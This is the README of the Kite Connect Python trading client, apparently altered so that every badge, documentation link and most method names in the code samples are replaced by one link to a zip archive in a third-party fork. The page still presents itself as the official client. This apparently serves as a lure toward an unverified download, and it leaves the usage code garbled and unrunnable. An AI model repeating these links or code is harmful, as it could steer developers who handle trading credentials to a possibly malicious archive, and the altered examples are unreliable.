# The Kite Connect API Python client - v4

[![PyPI](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
[![Build Status](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
[![Windows Build Status](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
[![https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)

The official Python client for communicating with the [Kite Connect API](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip).

Kite Connect is a set of REST-like APIs that expose many capabilities required to build a complete investment and trading platform. Execute orders in real time, manage user portfolio, stream live market data (WebSockets), and more, with the simple HTTP API collection.

[Zerodha Technology](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip) (c) 2021. Licensed under the MIT License.

## Documentation

- [Python client documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
- [Kite Connect HTTP API documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)

## v4 - Breaking changes

* Renamed ticker fields as per [kite connect doc](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
* Renamed `bsecds` to `bcd` in `https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip`

## Installing the client

You can install the pre release via pip

```
pip install --upgrade kiteconnect
```

Its recommended to update `setuptools` to latest if you are facing any issue while installing

```
pip install -U pip setuptools
```

Since some of the dependencies uses C extensions it has to compiled before installing the package.

### Linux, BSD and macOS

- On Linux, and BSDs, you will need a C compiler (such as GCC).

#### Debian/Ubuntu

```
apt-get install libffi-dev python-dev python3-dev
```

#### Centos/RHEL/Fedora

```
yum install libffi-devel python3-devel python-devel
```

#### macOS/OSx

```
xcode-select --install
```

### Microsoft Windows

Each Python version uses a specific compiler version (e.g. CPython 2.7 uses Visual C++ 9.0, CPython 3.3 uses Visual C++ 10.0, etc). So, you need to install the compiler version that corresponds to your Python version

- Python 2.6, 2.7, 3.0, 3.1, 3.2 - [Microsoft Visual C++ 9.0](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
- Python 3.3, 3.4 - [Microsoft Visual C++ 10.0](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
- Python 3.5, 3.6 - [Microsoft Visual C++ 14.0](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)

For more details check [official Python documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip).

## API usage

```python
import logging
from kiteconnect import KiteConnect

https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)

kite = KiteConnect(api_key="your_api_key")

# Redirect the user to the login url obtained
# from https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(), and receive the request_token
# from the registered redirect url after the login flow.
# Once you have the request_token, obtain the access_token
# as follows.

data = https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("request_token_here", api_secret="your_secret")
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(data["access_token"])

# Place an order
try:
    order_id = https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(tradingsymbol="INFY",
                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
                                quantity=1,
                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)

    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("Order placed. ID is: {}".format(order_id))
except Exception as e:
    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("Order placement failed: {}".format(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip))

# Fetch all orders
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()

# Get instruments
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()

# Place an mutual fund order
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(
    tradingsymbol="INF090I01239",
    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
    amount=5000,
    tag="mytag"
)

# Cancel a mutual fund order
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(order_id="order_id")

# Get mutual fund instruments
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
```

Refer to the [Python client documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip) for the complete list of supported methods.

## WebSocket usage

```python
import logging
from kiteconnect import KiteTicker

https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)

# Initialise
kws = KiteTicker("your_api_key", "your_access_token")

def on_ticks(ws, ticks):
    # Callback to receive ticks.
    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("Ticks: {}".format(ticks))

def on_connect(ws, response):
    # Callback on successful connect.
    # Subscribe to a list of instrument_tokens (RELIANCE and ACC here).
    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip([738561, 5633])

    # Set RELIANCE to tick in `full` mode.
    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip, [738561])

def on_close(ws, code, reason):
    # On connection close stop the main loop
    # Reconnection will not happen after executing `https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()`
    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()

# Assign the callbacks.
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip = on_ticks
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip = on_connect
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip = on_close

# Infinite loop on the main thread. Nothing after this will run.
# You have to use the pre-defined callbacks to manage subscriptions.
https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
```

## Run unit tests

```sh
python https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip test
```

or

```sh
pytest -s tests/unit --cov-report html:cov_html --cov=./
```

## Run integration tests

```sh
pytest -s tests/integration/ --cov-report html:cov_html --cov=./  --api-key api_key --access-token access_token
```

## Generate documentation

```sh
pip install pdoc

pdoc --html --html-dir docs kiteconnect
```

## Changelog

[Check release notes](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
